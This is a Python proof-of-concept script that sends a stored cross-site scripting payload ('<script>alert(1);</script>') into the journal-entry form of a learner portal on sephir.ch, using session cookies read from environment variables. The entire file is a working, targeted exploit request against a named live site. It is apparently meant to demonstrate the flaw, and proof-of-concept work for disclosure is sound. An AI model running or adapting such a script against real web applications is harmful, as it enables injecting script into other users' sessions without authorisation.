from requests_toolbelt import MultipartEncoder
import requests
import os

cfid = os.environ['SE_CFID']
cftoken = os.environ['SE_CFTOKEN']
folder = 'pro_44316'
title = "POC XSS"

m = MultipartEncoder(
    fields={'katalog': 'all', 'lehrort': 'bt', 'ordner': folder, 'ordnernr': '', 'ordnername': '', 'arbeitstitel': title, 'arbeitsbericht': '<script>alert(1);</script>', 'datum': '03.09.2021', 'aufwand': '0.0', 'neudok': ('filename', open('', 'rb'), 'application/octet-stream'), 'hkfilter': '', 'handlungskompetenz': '7633', 'handlungskompetenz_select': '', 'anzahlhk': '1', 'speichern': 'Speichern', 'arbeitID': '0', 'berimg': ''}
    )

r = requests.post('https://sephir.ch/ICT/user/lernendenportal/25_journal/jou_projekte.cfm?act=jouedit&sort=Datum%20DESC,Nr&cfid={}&cftoken={}'.format(cfid, cftoken), data=m,
                  headers={'Content-Type': m.content_type, 'Origin': 'https://sephir.ch', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1', 'Referer': 'https://sephir.ch/ICT/user/lernendenportal/25_journal/jou_projekte.cfm?act=jouedit&sort=Datum%20DESC,Nr&cfid={}&cftoken={}'.format(cfid, cftoken), 'Host': 'sephir.ch'})
